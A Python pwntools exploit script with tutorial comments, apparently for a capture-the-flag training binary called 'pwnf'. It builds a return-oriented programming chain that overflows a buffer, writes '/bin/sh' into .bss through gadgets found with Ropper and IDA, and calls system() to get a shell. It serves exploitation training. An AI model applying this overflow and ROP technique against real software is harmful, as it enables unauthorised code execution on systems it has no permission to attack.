#!/bin/python3

from pwn import *
context(arch="amd64")

p = process('./pwnf')

# Step 1 - Write the string "/bin/sh\0" somewhere in memory
# As we can see in this program, we have a "call system()" gadget at a predictable address, but nobody offered us a "/bin/sh\0" string! :(
# So we'll have to write it ourself to make a "system('/bin/sh')"!

# To do that, we need to perform a "write-what-where", meaning we'll write a custom stuff (= our string "/bin/sh\0") at an address we can choose 
# We can do this using a gadget having this pattern: mov [reg1], reg2 --> in this example we write reg2 (the "what") at the address pointed by reg1 (the "where")
# It means, in this case we'll also need to find "pop reg1" and "pop reg2" gadgets

# We'll try to find those using Ropper, which allows use to find custom pattern using expressions: '?' searchs for any character, '%' for any string
# So we'll start with this --> ropper -f pwnf --search "mov [???], ???; ret;"
# This pattern search is FAR from being perfect as it will exclude 64-bits registers having only 2 letters (r8 and r9 for example)
# However using "any string" search (ropper -f pwnf --search "mov [%], %; ret;") was giving too much junk / not interesting gadgets, so I chose to stick up with this first one
# Please note that Ropper can do more advanced pattern search using "--semantic" option, it's still under development as for now but I recommend you to check it

# Anyway, let's stick up with our search 'ropper -f pwnf --search "mov [???], ???; ret;"' that will be sufficient in this case. We obtain this:
#
# 0x000000000045f7ae: mov dword ptr [rax], edx; ret; 
# 0x0000000000477350: mov dword ptr [rcx], eax; ret; 
# [...]
# 0x000000000046d0f1: mov qword ptr [rsi], rax; ret; 
# 0x0000000000410e39: mov qword ptr [rsi], rdi; ret;
#
# It will be better to use a full 64 bits gadget to do this ("mov QWORD ptr [reg64], reg64"), because the string "/bin/sh\0" perfectly fits in a 64 bits register
# So we'll be able to do our write-what-where in 1 write, whereas if we use 'mov DWORD ptr [reg64], reg32' we'll need to perform 2 write ("/bin" then "/sh\0")
# (well, in this case we're using system() which takes in account environment variables, so just using string 'sh\0' could be sufficient though)

# Now, before chosing what "mov" gadget we choose, we need to find corresponding pair of "pop reg64" gadgets.
# We can do it using --> ropper -f pwnf --search "pop ???; ret"
# Multiple results are shown, but those 2 one are interesting:
#
# 0x0000000000401716: pop rdi; ret;
# 0x00000000004068d8: pop rsi; ret;
#
# They indeed fits with the gadget --> "0x0000000000410e39: mov qword ptr [rsi], rdi; ret;"!
# So we have our write-what-where! 
# 0x401716 to pop "/bin/sh\0" in RDI, 0x4068d8 to pop the address where we'll write our string in RSI, and 0x410e39 to move the string "/bin/sh\0" at this address!

pop_rdi_gadget = 0x401716
pop_rsi_gadget = 0x4068d8
write_rdiContent_at_rsiAddress = 0x410e39



# Step 2 - Now we have to choose WHERE to write our string "/bin/sh\0"!
# To do that, we need to find a section in the binary having "WRITE (w)" permissions

# One simple method to do that is to look as the section ".bss" which contain variables initialized with zeros and which is ALWAYS writable
# We can find interesting places in it with objdump --> objdump -x vulnerableProgram | grep ".bss"

# Personally, I also like to use IDA to look for all "writable" sections, so that's a possibility too. Menu "View" --> "Open subviews" --> "Segments" (shortcut SHIFT+F7)
# We can see multiple sections have "write (w)" permissions, for example .bss, .data or .got
# I decided to choose a random place in .bss, which is ".bss:00000000004A7400". We'll write our string here!
# It doesn't matter where you write it, just make sure you won't overwrite some "important" variable and make sure you have enough space to write the string (8 bytes needed here)

# To summarize:
# 1) We pop '/bin/sh\0' in RDI
# 2) We pop '0x4A7400' to RSI
# 3) We perform "mov qword ptr [rsi], rdi; ret;" to write '/bin/sh\0' string at address 0x4A7400

# IMPORTANT: '/bin/sh\0' string must be popped in RDI in LITTLE-ENDIAN!
# So we'll kinda pop ASCII '\0hs/nib/' to RDI, which means --> 0x0068732f6e69622f in hexadecimal!
# Now let's do this

payload = b'A'*24

payload += p64(pop_rdi_gadget)
payload += p64(0x0068732f6e69622f) # pop "/bin/sh\0" (in little-endian) to RDI

payload += p64(pop_rsi_gadget)
payload += p64(0x4A7400) # pop the address where to write the string (0x4A7400) to RSI

payload += p64(write_rdiContent_at_rsiAddress) # write the string (the "what") to this address (the "where")



# Step 3 - As usual, now we just have to load the address of a '/bin/sh\0' string in RDI then call system() in order to perform a "system('/bin/sh')"!
# So we have just have to pop "0x4A7400" to RDI (because we have written our string here), then use the "call system()" gadget!
# Using IDA/Ghidra we can find where is located our "call system()" gadget --> ".text:0000000000401BF8   call system"
# We already found a "pop rdi" gadget before (at address 0x401716) so we'll simply reuse it!
# Let's continue our payload construction

call_system_gadget = 0x401BF8

payload += p64(pop_rdi_gadget)
payload += p64(0x4A7400)  # pop the address of written "/bin/sh\0" in RDI
payload += p64(call_system_gadget) # then call system() and get a shell

print(p.recvline())
p.sendline(payload)
p.interactive()

# APPENDIX : finally I found out a "/bin/sh" string was already present in the binary at the address 0x47D828!
# So we don't specially need to write the string ourself as shown in this exercise!
# However, I think this wasn't intended by the chall-maker, and the goal here is to train and learn stuff so at least you now how to write a custom string in memory!
# It will be useful if you encounter a binary that REALLY doesn't have this string already, like in last exercise pwng!
